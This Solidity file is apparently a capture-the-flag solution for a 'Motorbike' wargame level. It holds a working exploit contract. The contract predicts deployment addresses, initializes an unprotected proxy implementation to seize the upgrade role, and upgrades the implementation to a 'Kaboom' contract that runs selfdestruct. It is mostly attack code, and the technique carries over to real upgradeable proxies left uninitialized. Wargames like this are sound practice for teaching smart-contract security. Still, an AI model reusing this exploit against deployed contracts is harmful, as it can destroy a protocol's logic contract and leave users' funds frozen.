// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MotorbikeExploit {

    address factory = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address lv_manager = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    function compute_addr(address owner, uint256 nonce) pure public returns (address) {

        if(nonce == 0x00)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), owner, byte(0x80))))));
        if(nonce <= 0x7f)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), owner, byte(uint8(nonce)))))));
        if(nonce <= 0xff)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), owner, byte(0x81), uint8(nonce))))));
        if(nonce <= 0xffff)   return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), owner, byte(0x82), uint16(nonce))))));
        if(nonce <= 0xffffff) return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd9), byte(0x94), owner, byte(0x83), uint24(nonce))))));
    }

    function pwn(uint16 nonce_factory) public returns (address) {
        // Due to a change in selfdestruct, the implementation must be created and destroyed in a single transaction

        // Find engine address
        address engine = compute_addr(factory, nonce_factory + 1);
        // Find proxy address
        address proxy = compute_addr(factory, nonce_factory + 2);

        // Create level (required order, this updates nonces)
        bytes memory payload = abi.encodeWithSignature("createLevelInstance(address)", factory);
        (bool success, ) = lv_manager.call(payload);
        emit TestBool(success);

        // Initialize engine
        payload = abi.encodeWithSignature("initialize()");
        (success, ) = engine.call(payload);
        emit TestBool(success);

        Kaboom boom = new Kaboom();

        // Boom it
        payload = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(boom), 0x0);
        (success, ) = engine.call(payload);
        emit TestBool(success);

        return engine;
    }
}

interface Engine {

    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract Kaboom {

    fallback() external payable {

        selfdestruct(payable(0));
    }
}